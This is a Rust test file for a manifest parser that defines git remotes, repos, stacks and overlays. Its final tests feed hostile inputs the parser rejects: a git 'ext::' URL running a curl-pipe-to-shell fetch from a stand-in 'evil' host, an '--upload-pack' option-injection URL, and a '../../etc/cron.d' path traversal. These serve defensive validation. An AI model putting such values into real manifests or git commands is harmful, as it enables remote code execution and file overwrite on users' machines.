#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::PathBuf;

use haw_core::manifest::{Manifest, ManifestError};
use haw_core::resolver::{self, ResolveError};

const EXAMPLE: &str = r#"
[remote.internal]
url = "git@gitlab.company.com:firmware"

[remote.github]
url = "git@github.com:acme"

[repo.kernel]
remote = "internal"
repo = "kernel.git"
rev = "v6.1.2"
groups = ["firmware"]

[repo.hal]
remote = "internal"
repo = "hal.git"
rev = "main"
groups = ["firmware"]

[repo.app-mqtt]
remote = "github"
repo = "app-mqtt.git"
rev = "release/2.x"
path = "apps/mqtt"

[stack.gateway]
repos = ["kernel", "hal", "app-mqtt"]

[stack.sensor-node]
repos = ["kernel", "hal"]

[overlay.dev.repo.kernel]
rev = "main"
"#;

#[test]
fn parses_the_reference_example() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    assert_eq!(manifest.remotes.len(), 2);
    assert_eq!(manifest.repos.len(), 3);
    assert_eq!(manifest.stacks.len(), 2);
    assert_eq!(manifest.overlays.len(), 1);

    let kernel = &manifest.repos["kernel"];
    assert_eq!(kernel.rev, "v6.1.2");
    assert_eq!(kernel.groups, ["firmware"]);
    assert_eq!(
        kernel.clone_url(&manifest.remotes).unwrap(),
        "git@gitlab.company.com:firmware/kernel.git"
    );
    assert_eq!(kernel.checkout_path("kernel"), PathBuf::from("kernel"));

    let mqtt = &manifest.repos["app-mqtt"];
    assert_eq!(mqtt.checkout_path("app-mqtt"), PathBuf::from("apps/mqtt"));
}

#[test]
fn round_trips_through_toml() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    let serialized = toml::to_string(&manifest).unwrap();
    let reparsed: Manifest = serialized.parse().unwrap();
    assert_eq!(manifest, reparsed);
}

#[test]
fn parses_and_round_trips_defaults() {
    let text = r#"
[defaults]
filter = "blob:none"
depth = 1

[repo.a]
url = "https://example.com/a.git"
rev = "main"
"#;
    let manifest: Manifest = text.parse().unwrap();
    assert_eq!(manifest.defaults.filter.as_deref(), Some("blob:none"));
    assert_eq!(manifest.defaults.depth, Some(1));

    // Round-trips: the [defaults] section survives serialization.
    let serialized = toml::to_string(&manifest).unwrap();
    assert!(serialized.contains("[defaults]"), "{serialized}");
    let reparsed: Manifest = serialized.parse().unwrap();
    assert_eq!(manifest, reparsed);
}

#[test]
fn submodules_defaults_and_per_repo_round_trip() {
    let text = r#"
[defaults]
submodules = true

[repo.a]
url = "https://example.com/a.git"
rev = "main"

[repo.b]
url = "https://example.com/b.git"
rev = "main"
submodules = true
"#;
    let manifest: Manifest = text.parse().unwrap();
    assert!(manifest.defaults.submodules);
    assert!(!manifest.repos["a"].submodules);
    assert!(manifest.repos["b"].submodules);

    // Round-trips: both the [defaults] flag and the per-repo flag survive.
    let serialized = toml::to_string(&manifest).unwrap();
    assert!(serialized.contains("submodules = true"), "{serialized}");
    let reparsed: Manifest = serialized.parse().unwrap();
    assert_eq!(manifest, reparsed);
}

#[test]
fn submodules_default_false_is_omitted() {
    let text = r#"
[repo.a]
url = "https://example.com/a.git"
rev = "main"
"#;
    let manifest: Manifest = text.parse().unwrap();
    assert!(!manifest.repos["a"].submodules);
    let serialized = toml::to_string(&manifest).unwrap();
    assert!(
        !serialized.contains("submodules"),
        "default-false submodules must not serialize: {serialized}"
    );
}

#[test]
fn defaults_absent_is_empty_and_omitted() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    assert!(manifest.defaults.is_empty());
    let serialized = toml::to_string(&manifest).unwrap();
    assert!(
        !serialized.contains("[defaults]"),
        "empty defaults must not be serialized"
    );
}

#[test]
fn rejects_unknown_remote() {
    let err = r#"
[repo.a]
remote = "nope"
repo = "a.git"
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::UnknownRemote { .. }));
}

#[test]
fn rejects_repo_without_source() {
    let err = r#"
[repo.a]
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::MissingSource(name) if name == "a"));
}

#[test]
fn rejects_ambiguous_source() {
    let err = r#"
[remote.r]
url = "git@example.com:x"

[repo.a]
url = "git@example.com:x/a.git"
remote = "r"
repo = "a.git"
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::AmbiguousSource(name) if name == "a"));
}

#[test]
fn rejects_unknown_repo_in_stack() {
    let err = r#"
[stack.p]
repos = ["ghost"]
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::UnknownRepoInStack { .. }));
}

#[test]
fn rejects_unknown_repo_in_overlay() {
    let err = r#"
[overlay.dev.repo.ghost]
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::UnknownRepoInOverlay { .. }));
}

#[test]
fn rejects_unknown_top_level_key() {
    assert!("[repos.a]\nrev = \"main\"\n".parse::<Manifest>().is_err());
}

#[test]
fn resolves_a_stack() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    let resolution = resolver::resolve(&manifest, "gateway", &[]).unwrap();
    assert_eq!(resolution.stack, "gateway");
    assert_eq!(resolution.repos.len(), 3);

    let kernel = &resolution.repos[0];
    assert_eq!(kernel.name, "kernel");
    assert_eq!(kernel.rev, "v6.1.2");
    assert_eq!(kernel.url, "git@gitlab.company.com:firmware/kernel.git");
    assert_eq!(kernel.path, PathBuf::from("kernel"));

    let mqtt = &resolution.repos[2];
    assert_eq!(mqtt.path, PathBuf::from("apps/mqtt"));
    assert_eq!(mqtt.url, "git@github.com:acme/app-mqtt.git");
}

#[test]
fn overlay_overrides_rev() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    let resolution = resolver::resolve(&manifest, "sensor-node", &["dev".into()]).unwrap();
    assert_eq!(resolution.repos[0].rev, "main");
    assert_eq!(resolution.repos[1].rev, "main");
}

#[test]
fn unknown_stack_and_overlay_error() {
    let manifest: Manifest = EXAMPLE.parse().unwrap();
    assert!(matches!(
        resolver::resolve(&manifest, "ghost", &[]),
        Err(ResolveError::UnknownStack(_))
    ));
    assert!(matches!(
        resolver::resolve(&manifest, "gateway", &["ghost".into()]),
        Err(ResolveError::UnknownOverlay(_))
    ));
}

#[test]
fn parses_repo_stack_lexicon_and_serializes_canonically() {
    let manifest: Manifest = r#"
[remote.r]
url = "git@example.com:org"

[repo.kernel]
remote = "r"
repo = "kernel.git"
rev = "main"

[stack.gateway]
repos = ["kernel"]

[overlay.dev.repo.kernel]
rev = "next"
"#
    .parse()
    .unwrap();
    assert_eq!(manifest.repos.len(), 1);
    assert_eq!(manifest.stacks["gateway"].repos, ["kernel"]);
    assert_eq!(
        manifest.overlays["dev"].repos["kernel"].rev.as_deref(),
        Some("next")
    );

    let out = toml::to_string(&manifest).unwrap();
    assert!(out.contains("[repo.kernel]"), "canonical spelling is repo");
    assert!(
        out.contains("[stack.gateway]"),
        "canonical spelling is stack"
    );
    let reparsed: Manifest = out.parse().unwrap();
    assert_eq!(manifest, reparsed);
}

#[test]
fn plugins_table_parses_and_round_trips() {
    let manifest: Manifest = r#"
[repo.kernel]
url = "git@github.com:acme/kernel.git"
rev = "main"

[plugins]
sbom = ["post-build", "pre-request"]
sign = ["post-land"]
"#
    .parse()
    .unwrap();
    assert_eq!(
        manifest.plugins["sbom"],
        vec!["post-build".to_string(), "pre-request".to_string()]
    );
    assert_eq!(manifest.plugins["sign"], vec!["post-land".to_string()]);

    let out = toml::to_string(&manifest).unwrap();
    assert!(out.contains("[plugins]"), "plugins table serialized");
    let reparsed: Manifest = out.parse().unwrap();
    assert_eq!(manifest, reparsed);
}

#[test]
fn plugins_reject_unknown_phase() {
    let err = r#"
[repo.kernel]
url = "git@github.com:acme/kernel.git"
rev = "main"

[plugins]
sbom = ["post-build", "not-a-phase"]
"#
    .parse::<Manifest>()
    .unwrap_err();
    match err {
        ManifestError::UnknownPluginPhase {
            plugin,
            phase,
            valid,
        } => {
            assert_eq!(plugin, "sbom");
            assert_eq!(phase, "not-a-phase");
            assert!(valid.contains("post-build"), "lists valid phases");
        }
        other => panic!("expected UnknownPluginPhase, got {other:?}"),
    }
}

#[test]
fn manifest_rejects_ext_url_rce() {
    let err = r#"
[repo.evil]
url = "ext::sh -c 'curl evil|sh'"
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    match err {
        ManifestError::Insecure { repo, .. } => assert_eq!(repo, "evil"),
        other => panic!("expected Insecure, got {other:?}"),
    }
}

#[test]
fn manifest_rejects_option_injection_url() {
    let err = r#"
[repo.evil]
url = "--upload-pack=touch /tmp/pwn"
rev = "main"
"#
    .parse::<Manifest>()
    .unwrap_err();
    assert!(matches!(err, ManifestError::Insecure { .. }));
}

#[test]
fn manifest_rejects_path_traversal() {
    let err = r#"
[repo.evil]
url = "https://github.com/o/r.git"
rev = "main"
path = "../../etc/cron.d/x"
"#
    .parse::<Manifest>()
    .unwrap_err();
    match err {
        ManifestError::Insecure { repo, .. } => assert_eq!(repo, "evil"),
        other => panic!("expected Insecure, got {other:?}"),
    }
}

#[test]
fn manifest_accepts_legitimate_urls_and_paths() {
    let manifest: Manifest = r#"
[repo.mqtt]
url = "https://github.com/o/mqtt.git"
rev = "main"
path = "apps/mqtt"

[repo.kernel]
url = "git@github.com:acme/kernel.git"
rev = "v1.0"
"#
    .parse()
    .unwrap();
    assert_eq!(manifest.repos.len(), 2);
}
